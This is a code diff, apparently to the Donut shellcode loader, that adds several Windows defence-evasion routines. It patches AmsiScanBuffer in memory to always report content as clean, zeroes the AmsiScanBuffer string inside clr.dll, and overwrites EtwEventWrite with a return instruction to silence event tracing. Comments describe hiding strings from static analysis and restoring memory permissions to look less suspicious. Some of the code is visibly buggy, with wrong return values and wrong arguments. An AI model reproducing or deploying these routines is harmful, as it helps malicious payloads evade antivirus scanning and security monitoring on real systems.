@@ -30,17 +30,161 @@
 */
 
 #include "bypass.h"
-#define BYPASS_AMSI_A
-#if defined(BYPASS_AMSI_NONE)
+#if defined(BYPASS_AMSI_E)
+#define NtCurrentPeb()            (NtCurrentTeb()->ProcessEnvironmentBlock)
+BOOL UnicodeStringToAnsiString(UNICODE_STRING* unicodeStr, char** ansiStr, PDONUT_INSTANCE inst) {
+    int bufferSize = inst->api.WideCharToMultiByte(CP_UTF8, 0, unicodeStr->Buffer, unicodeStr->Length / 2, NULL, 0, NULL, NULL);
+    if (bufferSize == 0) {
+        return FALSE;
+    }
+    *ansiStr = inst->api.VirtualAlloc(NULL, bufferSize + 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (*ansiStr == NULL) {
+        return STATUS_NO_MEMORY;
+    }
+
+    int result = inst->api.WideCharToMultiByte(CP_UTF8, 0, unicodeStr->Buffer, unicodeStr->Length / 2, *ansiStr, bufferSize, NULL, NULL);
+    if (result == 0) {
+        inst->api.VirtualFree(*ansiStr, bufferSize + 1, MEM_RELEASE | MEM_DECOMMIT);
+        return FALSE;
+    }
+
+    (*ansiStr)[bufferSize] = '\0';
+    
+    return FALSE;
+}
+
+int CompareDllPrefix(const char* str1, const char* str2) {
+    while (*str1 != '\0' && *str2 != '\0') {
+        if (*str1 == '.' && *(str1+1) == 'd' && *(str1+2) == 'l' && *(str1+3) == 'l') {
+            return 0;
+        }
+        if (*str2 == '.' && *(str2+1) == 'd' && *(str2+2) == 'l' && *(str2+3) == 'l') {
+            return 0;
+        }
+        if (*str1 != *str2) {
+            return 0;
+        }
+        str1++;
+        str2++;
+    }
+    return 1;
+}
+
+
+HMODULE FindModule(const char* moduleName, PDONUT_INSTANCE inst) {
+    // Get PEB address using NtCurrentPeb
+    PPEB peb = NtCurrentPeb();
+    PEB_LDR_DATA* ldrData = peb->Ldr;
+    LIST_ENTRY* head = &ldrData->InLoadOrderModuleList;
+    LIST_ENTRY* current = head->Flink;
+
+    // Iterate over the linked list of loaded modules
+    while (current != head) {
+        LDR_DATA_TABLE_ENTRY* entry = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+        char* ansiStr;
+        UnicodeStringToAnsiString(&entry->BaseDllName, &ansiStr, inst);
+        int eq = CompareDllPrefix(ansiStr, moduleName);
+        if (entry && CompareDllPrefix(ansiStr, moduleName)) {
+          DPRINT("Found Amsi.dll at: %p", entry->DllBase);
+          return (HMODULE)entry->DllBase;
+        }
+        current = current->Flink;
+    }
+    return NULL;
+}
+
+void* FindExportTable(HMODULE hModule) {
+    // Uzyskaj nagłówek DOS
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
+    
+    // Sprawdzenie, czy nagłówek DOS jest poprawny
+    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
+        return;
+    }
+
+    // Przejdź do nagłówka NT
+    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
+    
+    // Sprawdzenie, czy nagłówek NT jest poprawny
+    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
+        return;
+    }
+
+    // Znajdź adres tabeli eksportów
+    DWORD exportTableRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+    if (exportTableRVA == 0) {
+        return;
+    }
+
+    // Oblicz adres tabeli eksportów w pamięci
+    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportTableRVA);
+    return exportDir;
+}
+
+HRESULT WINAPI AmsiScanBufferStub(
+    HAMSICONTEXT amsiContext,
+    PVOID        buffer,
+    ULONG        length,
+    LPCWSTR      contentName,
+    HAMSISESSION amsiSession,
+    AMSI_RESULT  *result)
+{    
+    *result = AMSI_RESULT_CLEAN;
+    return S_OK;
+}
+
+int AmsiScanBufferStubEnd(int a, int b) {
+    return a * b;
+}
+
 BOOL DisableAMSI(PDONUT_INSTANCE inst) {
-  return TRUE;
+  xGetLibAddress(inst, inst->amsi);
+  HMODULE amsiDll = FindModule(inst->amsi, inst);  // Find the AMSI library
+  if (amsiDll == NULL) {
+      return FALSE;
+  }
+  PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)FindExportTable(amsiDll);
+  if (!exportDir) {
+    return FALSE;
+  }
+
+  DWORD* pFunctionAddresses = (DWORD*)((BYTE*)amsiDll + exportDir->AddressOfFunctions);
+  DWORD* pFunctionNames = (DWORD*)((BYTE*)amsiDll + exportDir->AddressOfNames);
+  WORD* pNameOrdinals = (WORD*)((BYTE*)amsiDll + exportDir->AddressOfNameOrdinals);
+
+  for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
+    char* funcName = (char*)((BYTE*)amsiDll + pFunctionNames[i]);
+    if (compare(funcName, inst->amsiScanBuf)) {
+        // Znaleziono nazwę funkcji, zwróć jej adres
+        DWORD functionRVA = pFunctionAddresses[pNameOrdinals[i]];
+        void* functionAddr = (void*)((BYTE*)amsiDll + functionRVA);
+        DPRINT("Fuzzing AmsiScanBuffer at: %p", functionAddr);
+        DWORD len = (ULONG_PTR)AmsiScanBufferStubEnd -
+        (ULONG_PTR)AmsiScanBufferStub;
+        DWORD op = 0;
+        DWORD t = 0;
+        if(!inst->api.VirtualProtect(
+          functionAddr, len, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
+          
+        DPRINT("Overwriting AmsiScanBuffer");
+        // over write with virtual address of stub
+        Memcpy(functionAddr, ADR(PCHAR, AmsiScanBufferStub), len);   
+        // set memory back to original protection
+        inst->api.VirtualProtect(functionAddr, len, op, &t);
+        return TRUE;
+    }
+  }
+  
+  DPRINT("Function not found.");
+  return FALSE;
 }
 
 #elif defined(BYPASS_AMSI_A)
 BOOL DisableAMSI(PDONUT_INSTANCE inst) {
-  BOOL ret = //DisableAMSI_A(inst) &&
-  //DisableAMSI_B(inst) &&
-  DisableAMSI_C(inst);
+  BOOL ret = DisableAMSI_A(inst) &&
+  DisableAMSI_B(inst) &&
+  DisableAMSI_C(inst) &&
+  DisableAMSI_D(inst);
   return ret;
 }
 
@@ -177,6 +321,103 @@ BOOL DisableAMSI_C(PDONUT_INSTANCE inst) {
     }
     DPRINT("Method C return %i", disabled);
     return disabled;
+}
+
+BOOL Path_CLR(MEMORY_BASIC_INFORMATION* region, PDONUT_INSTANCE inst) {
+  for (int j = 0; j < region->RegionSize - sizeof(unsigned char*); j++) {
+    unsigned char* current = ((unsigned char*)region->BaseAddress) + j;
+
+    //See if the current pointer points to the string "AmsiScanBuffer." In SpecterInsight
+    //the Parameters->AMSISCANBUFFER is a value that is decoded at runtime in order to
+    //avoid static analysis
+    BOOL found = TRUE;
+    for (int k = 0; k < sizeof(inst->amsiScanBuf); k++) {
+        if (current[k] != inst->amsiScanBuf[k]) {
+            found = FALSE;
+            break;
+        }
+    }
+
+    if (found) {
+        //We found the string. Now we need to modify permissions, if necessary
+        //to allow us to overwrite it
+        DWORD original = 0;
+        if ((region->Protect & PAGE_READWRITE) != PAGE_READWRITE) {
+            inst->api.VirtualProtect(region->BaseAddress, region->AllocationBase, PAGE_EXECUTE_READWRITE, &original);
+        }
+
+        //Overwrite the strings with zero. This will now be an "empty" string.
+        for (int m = 0; m < sizeof(inst->amsiScanBuf); m++) {
+            current[m] = 0;
+        }
+
+        //Restore permissions if necessary so it looks less suspicious.
+        if ((region->Protect & PAGE_READWRITE) != PAGE_READWRITE) {
+            inst->api.VirtualProtect(region->BaseAddress, region->RegionSize, region->Protect, &original);
+        }
+        return TRUE;
+    }
+    return FALSE;
+  }
+}
+
+BOOL DisableAMSI_D(PDONUT_INSTANCE inst) {
+  HANDLE hProcess = inst->api.GetCurrentProcess();
+
+  //Load system info to identify allocated memory regions
+  SYSTEM_INFO sysInfo;
+  inst->api.GetSystemInfo(&sysInfo);
+  
+  //Generate a list of memory regions to scan
+  unsigned char* pAddress = 0;// (unsigned char*)sysInfo.lpMinimumApplicationAddress;
+  MEMORY_BASIC_INFORMATION memInfo;
+  char path[MAX_PATH];
+  int count = 0;
+  LPVOID clr = inst->api.GetModuleHandleA(inst->clr);
+  //Query memory region information
+  inst->api.VirtualQuery(clr, &memInfo, sizeof(memInfo));
+  if(Path_CLR(&memInfo, inst)) {
+          count++;
+  }
+
+  if (count > 0) {
+      return TRUE;
+  } else {
+      return FALSE;
+  }
+}
+
+BOOL CheckStr(const char* str, int length) {
+    if (length < 7) {
+        return FALSE;
+    }
+
+    //Why the weird check? I'm trying not to store the string "clr.dll" in the
+    //binary without being encoded
+    int offset = length - 1;
+    if (str[offset] == 'l' || str[offset] == 'L') {
+        offset = offset - 1;
+        if (str[offset] == 'l' || str[offset] == 'L') {
+            offset = offset - 1;
+            if (str[offset] == 'd' || str[offset] == 'D') {
+                offset = offset - 1;
+                if (str[offset] == '.') {
+                    offset = offset - 1;
+                    if (str[offset] == 'r' || str[offset] == 'R') {
+                        offset = offset - 1;
+                        if (str[offset] == 'l' || str[offset] == 'L') {
+                            offset = offset - 1;
+                            if (str[offset] == 'c' || str[offset] == 'C') {
+                                return TRUE;
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    return FALSE;
 }
 
 #elif defined(BYPASS_AMSI_B)
@@ -494,28 +735,68 @@ BOOL DisableWLDP(PDONUT_INSTANCE inst) {
 }
 #endif
 
-#if defined(BYPASS_ETW_A)
+#if defined(BYPASS_ETW_NONE)
+BOOL DisableETW(PDONUT_INSTANCE inst) {
+  return TRUE;
+}
+
+#elif defined(BYPASS_ETW_A)
 // This is where you may define your own ETW bypass.
 // To rebuild with your bypass, modify the makefile to add an option to build with BYPASS_ETW_A defined.
 BOOL DisableETW(PDONUT_INSTANCE inst) {
-  HMODULE dll;
-  DWORD   t;
-  LPVOID  ptr;
-  DWORD OldProtect = 0;
-	DWORD memPage = 3;
+  HMODULE ntdll = FindModule(inst->ntdll, inst);  // Find the AMSI library
+  if (ntdll == NULL) {
+      return FALSE;
+  }
+  PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)FindExportTable(ntdll);
+  if (!exportDir) {
+    return FALSE;
+  }
 
-  dll = xGetLibAddress(inst, inst->ntdll);
-  if(dll == NULL) return TRUE;
-  DPRINT("Get dll Ntdll");
+  DWORD* pFunctionAddresses = (DWORD*)((BYTE*)ntdll + exportDir->AddressOfFunctions);
+  DWORD* pFunctionNames = (DWORD*)((BYTE*)ntdll + exportDir->AddressOfNames);
+  WORD* pNameOrdinals = (WORD*)((BYTE*)ntdll + exportDir->AddressOfNameOrdinals);
+
+  for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
+    char* funcName = (char*)((BYTE*)ntdll + pFunctionNames[i]);
+    if (compare(funcName, inst->etwEventWrite)) {
+        DWORD functionRVA = pFunctionAddresses[pNameOrdinals[i]];
+        void* functionAddr = (void*)((BYTE*)ntdll + functionRVA);
+        DPRINT("Fuzzing etwEventWrite at: %p", functionAddr);
+        DWORD op = 0;
+        DWORD t = 0;
+
+        #ifdef _WIN64
+            // make the memory writeable. return FALSE on error
+            if (!inst->api.VirtualProtect(
+                functionAddr, 1, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
+
+            DPRINT("Overwriting EtwEventWrite");
+
+            // over write with "ret"
+            Memcpy(functionAddr, inst->etwRet64, 1);
+
+            // set memory back to original protection
+            inst->api.VirtualProtect(functionAddr, 1, op, &t);
+        #else
+            // make the memory writeable. return FALSE on error
+            if (!inst->api.VirtualProtect(
+                functionAddr, 4, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
+
+            DPRINT("Overwriting EtwEventWrite");
+
+            // over write with "ret 14h"
+            Memcpy(functionAddr, inst->etwRet32, 4);
+
+            // set memory back to original protection
+            inst->api.VirtualProtect(functionAddr, 4, op, &t);
+        #endif
+        return TRUE;
+    }
+  }
   
-  ptr = xGetProcAddress(inst, dll, inst->ntTraceEvent, 0);
-  if(ptr == NULL) return FALSE;
-  DPRINT("Get NtTraceEvent");
-
-  if(inst->api.VirtualProtect(&ptr, memPage, PAGE_EXECUTE_READWRITE, &OldProtect)) return FALSE;
-  Memcpy(ptr, "\xc3", 1);
-	if(inst->api.VirtualProtect(&ptr, memPage, OldProtect, &t)) return FALSE;
-	return TRUE;
+  DPRINT("Function not found.");
+  return FALSE;
 }
 
 #elif defined(BYPASS_ETW_B)
